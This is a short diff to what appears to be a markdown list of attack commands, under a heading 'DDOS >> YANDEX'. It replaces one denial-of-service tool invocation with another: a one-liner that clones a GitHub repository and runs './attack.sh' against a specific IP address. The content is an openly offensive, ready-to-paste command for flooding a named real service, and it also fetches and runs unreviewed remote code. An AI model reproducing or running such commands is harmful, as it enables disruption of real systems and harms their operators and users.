@@ -16,8 +16,7 @@
 ***
 ### DDOS >> YANDEX
 ```
-https://github.com/cyweb/hammer && cd hammer \
-python3 hammer.py -s 5.255.255.50
+git clone https://github.com/dxh-team/CDUW && cd CDUW && ./attack.sh -s 5.255.255.50
 ```
 
 ***
